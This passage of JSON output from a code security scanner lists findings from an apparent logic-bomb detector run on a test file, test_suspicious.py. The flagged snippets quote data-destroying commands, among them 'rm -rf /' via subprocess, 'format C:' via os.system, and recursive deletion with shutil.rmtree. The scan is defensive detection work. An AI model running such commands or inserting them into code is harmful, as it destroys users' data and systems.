    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "shutil.rmtree('/important_data')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.767243",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "36826342-9841-48b1-a2b4-4fc755c86edd",
    "last_modified": "",
    "line_number": 12,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.767243"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.system('format C:')",
    "column": 8,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.768246",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "3004e94a-be06-4847-a303-e2129fe86b4a",
    "last_modified": "",
    "line_number": 13,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "System formatting - Complete data destruction",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.768246"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "subprocess.call(['rm', '-rf', '/'])",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.771244",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "3d9a0397-d23f-4ef3-ba06-667fae14d50d",
    "last_modified": "",
    "line_number": 14,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.771244"
  },
  {
    "ait_tag": "AIT",
    "assignee": null,
    "attack_vector": "UNKNOWN",
    "business_impact": "Medium",
    "code_snippet": "os.remove('/critical_file.txt')",
    "column": 5,
    "compliance_impact": "None",
    "component_name": "",
    "creation_date": "2025-08-11T21:44:01.771244",
    "data_classification": "UNKNOWN",
    "debt_category": "DESTRUCTIVE_ACTION",
    "effort": 120,
    "exploitability": "UNKNOWN",
    "file_name": "test_suspicious.py",
    "file_path": "c:\\Users\\91770\\Downloads\\test_files\\test_suspicious.py",
    "id": "fa8bbc46-002a-466d-924a-27e4767d8ae3",
    "last_modified": "",
    "line_number": 28,
    "message": "Detects potentially destructive operations that could be payloads of logic bombs",
    "payload_analysis": "File/directory deletion - Data loss risk",
    "priority_score": 0,
    "repo_name": "unknown-repo",
    "rule_id": "destructive-payload-detector",
    "scan_id": "31146053-ec41-432e-816c-21b2af599f65",
    "security_domain": "APPLICATION",
    "severity": "CRITICAL_BOMB",
    "spk_tag": "SPK-DEFAULT",
    "status": "ACTIVE_THREAT",
    "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
    "team_owner": "",
    "threat_level": "EXTREME",
    "trigger_analysis": "Direct destructive action detected",
    "type": "DESTRUCTIVE_PAYLOAD",
    "update_date": "2025-08-11T21:44:01.771244"
  }
]